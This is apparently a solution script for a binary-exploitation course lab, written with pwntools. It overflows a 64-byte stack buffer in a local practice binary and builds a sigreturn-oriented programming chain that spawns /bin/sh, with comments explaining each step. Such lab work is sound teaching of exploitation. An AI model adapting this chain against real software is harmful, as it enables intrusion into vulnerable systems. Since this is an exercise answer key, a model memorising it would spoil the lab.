#!/usr/bin/env python3
from pwn import *
import os
import time

# -----------------------------------------------------------------------------
# Lab 0x07 – Exercise 3: Signal-Return Oriented Jailbreak (SROP)
#
# Goal:
#   Exploit the tiny ex3 binary (intro + one read + exit) using a
#   sigreturn-oriented programming chain to execute:
#       execve("/bin/sh", NULL, NULL)
#
# Binary summary (from ex3.asm):
#   - intro(): write(1, msg, 40); ret
#   - read_buf():
#         sub rsp, 64               ; alloc 64B stack "buffer"
#         read(0, rsp, 512)         ; overflows past saved RIP
#         add rsp, 64
#         ret
#   - _start:
#         call intro
#         call read_buf             ; we overflow this return
#         exit(0)
#
# Core idea:
#   1) First read_buf overflow:
#        - Overwrite its return address to call read_buf again.
#        - Place a second return address to a 'syscall' gadget.
#        - Place a fake SigreturnFrame right after that.
#   2) Second read_buf:
#        - We send exactly 15 bytes, so read() returns 15 -> RAX = 15.
#        - After it returns, it 'ret's into the syscall gadget.
#   3) That syscall executes with RAX = 15 => rt_sigreturn.
#        - The kernel interprets the fake SigreturnFrame on the stack,
#          restoring registers such that:
#              RAX = 59 (sys_execve), RDI = "/bin/sh", RSI = 0, RDX = 0,
#              RIP = syscall gadget again.
#        - When rt_sigreturn returns to userland, we immediately do
#          another syscall with RAX = 59: execve("/bin/sh", NULL, NULL).
# -----------------------------------------------------------------------------


# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
exe = './bin/ex3'

# Quick sanity check: make sure the binary exists.
if not os.path.exists(exe):
    log.error(f"Binary {exe} not found. Run 'make ex3' first.")

# Load the ELF so pwntools knows the architecture and symbols (read_buf, etc.).
elf = context.binary = ELF(exe, checksec=False)

# Not too noisy, but still see important info.
context.log_level = 'info'


def start():
    """
    Launch the vulnerable binary locally.

    ex3 is a simple ELF with no arguments; it prints a greeting
    ("Hello hacker! Feel free to go insane...") and then does a single
    read via read_buf().
    """
    return process(exe)


def solve():
    """
    Build and send the SROP exploit:

      1. Locate important gadgets and addresses.
      2. Create a SigreturnFrame that will perform execve("/bin/sh").
      3. Craft a first overflow that:
           - returns into read_buf again
           - then returns into a 'syscall' gadget
           - then has our fake sigreturn frame on the stack
      4. Trigger a second read of 15 bytes to set RAX = 15,
         then let execution flow into the syscall (rt_sigreturn),
         and finally into execve("/bin/sh").
    """
    io = start()

    # -------------------------------------------------------------------------
    # 1. Gather gadgets and addresses
    # -------------------------------------------------------------------------
    #
    # In ex3.asm, /bin/sh is stored in the .rodata label 'gift'.
    # We just search the ELF for that string.
    bin_sh = next(elf.search(b'/bin/sh'))

    # Address of read_buf() function (we'll "return" into this again).
    read_buf = elf.symbols['read_buf']

    # Any 'syscall' instruction will work as our gadget. We search the
    # .text section for the raw opcode 'syscall'.
    syscall_gadget = next(elf.search(asm('syscall')))

    log.info(f"Target: /bin/sh @ {hex(bin_sh)}")
    log.info(f"Target: read_buf @ {hex(read_buf)}")
    log.info(f"Target: syscall  @ {hex(syscall_gadget)}")

    # -------------------------------------------------------------------------
    # 2. Construct the SROP frame
    # -------------------------------------------------------------------------
    #
    # We use pwntools' SigreturnFrame to build the rt_sigframe expected
    # by the kernel for the rt_sigreturn (syscall 15).
    #
    # After rt_sigreturn, registers will be restored from this frame,
    # so we configure them for a subsequent execve("/bin/sh", 0, 0)
    # system call that starts at RIP = syscall_gadget.
    frame = SigreturnFrame()

    # On x86_64:
    #   - RAX holds the syscall number
    #   - RDI, RSI, RDX are the first three arguments
    #
    # 59 == __NR_execve
    frame.rax = 59             # sys_execve
    frame.rdi = bin_sh         # filename: pointer to "/bin/sh"
    frame.rsi = 0              # argv: NULL
    frame.rdx = 0              # envp: NULL

    # After sigreturn, the CPU will continue at frame.rip.
    # We set this to the same 'syscall' gadget, so it will execute:
    #   syscall    ; with RAX=59, RDI="/bin/sh", RSI=0, RDX=0
    # which is execve("/bin/sh", NULL, NULL).
    frame.rip = syscall_gadget

    # (We don't care what RSP is after execve, since we expect to end up
    #  in a new process image running /bin/sh.)

    # -------------------------------------------------------------------------
    # 3. Construct the initial overflow payload
    # -------------------------------------------------------------------------
    #
    # Stack layout inside read_buf (first call), after `sub rsp, 64`
    # and before the read:
    #
    #   rsp -> [ 64 byte buffer we control via read()............... ]
    #          [ saved return address back into _start (call site)  ]
    #          [ next qword on stack                                ]
    #          ...
    #
    # read() reads 512 bytes into that 64-byte buffer, so we can:
    #   - overwrite the saved return address and the words after it.
    #
    # We want:
    #   1) First `ret` from read_buf (the initial call) to go to read_buf
    #      again, so we can perform a second read.
    #   2) Second `ret` (after the second read_buf) to go to syscall_gadget.
    #   3) When we finally hit syscall_gadget, RSP must point at the start
    #      of the SigreturnFrame.
    #
    # Layout of our payload in the first read:
    #
    #   [0..63]   : 64 bytes of padding (fills the local buffer)
    #   [64..71]  : address of read_buf        (first ret target)
    #   [72..79]  : address of syscall_gadget  (second ret target)
    #   [80..]    : bytes(frame)               (fake rt_sigframe)
    #
    # After the first read_buf finishes:
    #   - add rsp, 64  -> rsp points at [64..]
    #   - ret          -> jumps to read_buf (from [64..71])
    #
    # Now we're in read_buf again (second time), but we *didn't* push a new
    # return address: we arrived there via ret, not via call. The stack looks
    # like:
    #
    #   rsp -> [ syscall_gadget ] [ frame... ]
    #
    # The second read_buf:
    #   - sub rsp, 64
    #   - read(0, rsp, 512)  -> we will send 15 bytes
    #   - add rsp, 64        -> rsp restored to original (pointing at gadget)
    #   - ret                -> jumps to syscall_gadget
    #
    # At that moment:
    #   - RAX = number of bytes read by the second read, i.e., 15
    #   - RSP = address of the fake frame (right after the gadget)
    #
    # So `syscall` with RAX=15 triggers rt_sigreturn and consumes the frame.
    payload  = b'A' * 64                    # overflow the 64B buffer
    payload += p64(read_buf)                # first ret -> read_buf again
    payload += p64(syscall_gadget)          # second ret -> syscall (for sigreturn)
    payload += bytes(frame)                 # fake rt_sigframe on the stack

    log.info("Sending initial SROP chain (first overflow)...")

    # The program prints:
    #   "Hello hacker! Feel free to go insane...\n"
    # at startup. We wait for that line, then send the payload that will
    # overflow read_buf() during its first call.
    io.sendafter(b'insane...\n', payload)

    # -------------------------------------------------------------------------
    # 4. Trigger rt_sigreturn by making read() return 15
    # -------------------------------------------------------------------------
    #
    # After the first overflow, control flow is:
    #   _start -> (ret) read_buf -> read() (second time)
    #
    # That second read is waiting for more data from stdin.
    # We send exactly 15 bytes so that:
    #   - read() returns 15
    #   - RAX = 15
    #
    # Then read_buf does:
    #   add rsp, 64
    #   ret
    #
    # which returns into syscall_gadget. With RAX=15, that 'syscall'
    # becomes rt_sigreturn, and the kernel uses our fake frame.
    log.info("Sending 15 bytes to set RAX = 15 and trigger rt_sigreturn...")
    time.sleep(0.1)  # small delay for cleanliness; usually not strictly needed
    io.send(b'C' * 15)

    # After rt_sigreturn, the kernel restores regs from our frame:
    #   RAX = 59, RDI = /bin/sh, RSI = 0, RDX = 0, RIP = syscall_gadget
    #
    # Execution resumes at syscall_gadget again, now as:
    #   syscall   ; with RAX=59 -> execve("/bin/sh", 0, 0)
    #
    # If execve succeeds, we're now in a /bin/sh spawned by the challenge.
    io.interactive()


if __name__ == "__main__":
    solve()

